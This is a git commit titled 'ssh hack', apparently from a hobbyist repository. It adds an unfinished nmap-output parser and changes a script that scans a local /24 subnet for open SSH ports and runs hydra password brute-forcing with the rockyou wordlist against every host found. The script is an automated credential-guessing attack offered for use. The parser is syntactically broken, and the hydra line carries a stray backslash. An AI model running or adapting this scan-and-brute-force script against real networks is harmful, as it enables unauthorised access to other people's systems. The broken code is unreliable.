6513800c1c34e91aaff554732334964e5d2c8b76
piragenth-ltfb <111213108+piragenth-ltfb@users.noreply.github.com>
2023-08-20 01:14:52 +0530

    ssh hack

---
+++ nmap.py
@@ -0,0 +1,18 @@
+nmap = open("nmap.txt","r")
+t=0
+y=0
+x = ""
+nmap_r = nmap.read()
+nmap_r = nmap_r.strip()
+for i in nmap_r:
+ #   if i == " ":
+ #       print("")
+    if 1 == 1:
+        x += i
+#        print(x)
+ #       print(x[-4:-1])
+        if x[-4:-1] == 'for':
+ #           x = x + i
+            if 11
+
+# ip address lenth change 
--- ssh-hack.py
+++ ssh-hack.py
@@ -1,9 +1,10 @@
 import os
-
-list = 0
+one = '| grep "/open" '
+two = "| awk '{ print $2 }'"
+os.system(f"nmap --open -p 22 192.168.1.1/24 -oG - {one} {two}  >> ssh.txt")
 
 ssh = open("ssh.txt",'r')
 for account in ssh:
-    list += 1
 #    os.system("hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4")
-    os.system(f"hydra -L users.txt -P rockyou.txt ssh://{account} -t 4")
+    os.system(f"hydra -L users.txt -P rockyou.txt ssh://{account} \ -t 4")
+#    print(f'hydra -L users.txt -P rockyou.txt ssh://{account} \ -t 4')
